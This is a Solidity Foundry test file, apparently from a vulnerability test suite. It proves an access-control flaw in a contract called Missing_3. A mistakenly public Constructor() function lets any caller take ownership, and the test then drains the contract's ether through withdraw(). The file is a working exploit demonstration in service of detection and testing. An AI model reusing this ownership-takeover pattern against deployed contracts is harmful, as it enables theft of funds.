
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_3} from "../src/Missing_3.sol";

contract TestAccessControlMissing_3 is Test {
    Missing_3 private target;
    address private deployer;

    function setUp() public {
        deployer = address(this);
        target = new Missing_3();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Note: We do NOT exclude the deployer here because the vulnerability is that
        // the Constructor() function is public and can be called by anyone to become owner.
        // The actual constructor was never called, so owner is address(0) initially.

        // --- 2. State Configuration ---
        // Fund the contract so we can verify the vulnerability allows draining funds
        vm.deal(address(target), 1 ether);
        
        // Fund the caller for gas
        vm.deal(caller, 1 ether);

        // --- 3. Execution & Assertion ---
        
        // The vulnerability: Constructor() is a regular public function, not a real constructor.
        // Any arbitrary user can call it to become the owner.
        
        // Switch context to the arbitrary caller
        vm.prank(caller);
        
        // Call the fake Constructor function - this should succeed for ANY caller
        // This is the vulnerability: an arbitrary user can call Constructor() to become owner
        target.Constructor();
        
        // Now the caller is the owner, they can withdraw all funds
        // This proves the vulnerability is exploitable
        uint256 contractBalanceBefore = address(target).balance;
        uint256 callerBalanceBefore = caller.balance;
        
        vm.prank(caller);
        target.withdraw();
        
        // Assert that the caller successfully drained the contract
        assertEq(address(target).balance, 0, "Contract should be drained");
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore, "Caller should receive funds");
    }
}
